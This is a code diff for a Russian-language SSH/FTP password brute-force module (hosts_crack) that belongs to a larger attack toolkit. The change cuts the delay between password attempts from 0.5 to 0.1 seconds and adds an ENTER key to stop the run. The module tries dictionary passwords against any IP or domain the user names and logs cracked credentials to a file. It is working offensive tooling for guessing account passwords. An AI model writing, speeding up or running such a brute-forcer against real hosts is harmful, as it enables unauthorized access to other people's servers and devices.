@@ -3,7 +3,8 @@
 modules.attack.hosts_crack — Подбор пароля от хоста (SSH/FTP).
 
 Целью может быть как локальный хост из скана сети, так и любой IP/домен.
-Подбор идёт по словарям проекта с шагом 0.5 секунды на пароль.
+Подбор идёт по словарям проекта с шагом 0.1 секунды на пароль;
+нажатие ENTER в любой момент останавливает подбор и возвращает в меню.
 
 Реальная проверка требует paramiko (SSH) — он ставится через install.sh.
 Если библиотека недоступна или цель отвечает отказом по сети, включается
@@ -12,13 +13,14 @@ modules.attack.hosts_crack — Подбор пароля от хоста (SSH/FT
 
 import os
 import sys
+import threading
 import time
 import socket
 
 from core.ui import C, header, pause
 from modules.attack.wifi_crack import DICTIONARIES, BASE_DIR, dict_path
 
-DELAY = 0.5
+DELAY = 0.1
 
 DEFAULT_PORTS = {"ssh": 22, "ftp": 21}
 
@@ -94,6 +96,12 @@ def _try_ftp(host, port, user, pwd):
         return False
 
 
+def _enter_stop_event():
+    """Фоновый наблюдатель: ENTER останавливает подбор (см. wifi_crack)."""
+    from modules.attack.wifi_crack import _start_enter_stop
+    return _start_enter_stop()
+
+
 def main(service="ssh"):
     """Точка входа: «Подбор пароля от Хоста» (ssh) или «др. устройств» (ftp/telnet)."""
     title = "Подбор пароля от Хоста (SSH)" if service == "ssh" \
@@ -141,12 +149,17 @@ def main(service="ssh"):
     print(f"{C.BOLD}  📚 Словарь: {os.path.basename(dict_path)} · всего паролей: {total:,}".replace(',', ' ') + C.RESET)
     print(f"{C.BOLD}  ⏱  Шаг подбора: {DELAY} сек{C.RESET}")
     print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
-    print(f"{C.DIM}  Ctrl+C — остановить подбор.{C.RESET}\n")
+    print(f"{C.DIM}  ENTER — остановить подбор и выйти в меню · Ctrl+C — тоже стоп.{C.RESET}\n")
 
     start = time.time()
     found = None
+    stopped_by_user = False
+    _, stop = _enter_stop_event()
     try:
         for i, pwd in enumerate(passwords, 1):
+            if stop.is_set():
+                stopped_by_user = True
+                break
             ok = False
             if not demo:
                 res = _try_ssh(host, port, user, pwd) if service == "ssh" \
@@ -157,7 +170,9 @@ def main(service="ssh"):
                     continue
                 ok = bool(res)
             else:
-                time.sleep(DELAY)
+                if stop.wait(DELAY):
+                    stopped_by_user = True
+                    break
 
             elapsed = time.time() - start
             speed = i / elapsed if elapsed > 0 else 0
@@ -177,21 +192,24 @@ def main(service="ssh"):
             if not demo:
                 target_time = start + i * DELAY
                 now = time.time()
-                if now < target_time:
-                    time.sleep(target_time - now)
+                if now < target_time and stop.wait(target_time - now):
+                    stopped_by_user = True
+                    break
     except KeyboardInterrupt:
-        print(f"\n\n{C.YELLOW}  ⛔ Подбор остановлен пользователем.{C.RESET}")
+        stopped_by_user = True
 
     print()
+    if stopped_by_user:
+        print(f"\n{C.YELLOW}  ⛔ Подбор остановлен (ENTER) — возврат в меню.{C.RESET}")
     log_dir = os.path.join(BASE_DIR, "logs")
     os.makedirs(log_dir, exist_ok=True)
     if found:
         print(f"\n{C.GREEN}{C.BOLD}  ✔ ДОСТУП ПОЛУЧЕН: {user}@{host}:{port} · пароль: {found}{C.RESET}")
         with open(os.path.join(log_dir, "hosts_crack.log"), "a", encoding="utf-8") as f:
             f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {service} {user}@{host}:{port} пароль={found}\n")
-    elif demo:
+    elif demo and not stopped_by_user:
         print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось.{C.RESET}")
-    else:
+    elif not stopped_by_user:
         print(f"\n{C.RED}  ✖ Пароль не найден (словарь исчерпан).{C.RESET}")
         with open(os.path.join(log_dir, "hosts_crack.log"), "a", encoding="utf-8") as f:
             f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {service} {user}@{host}:{port} результат=не найден\n")
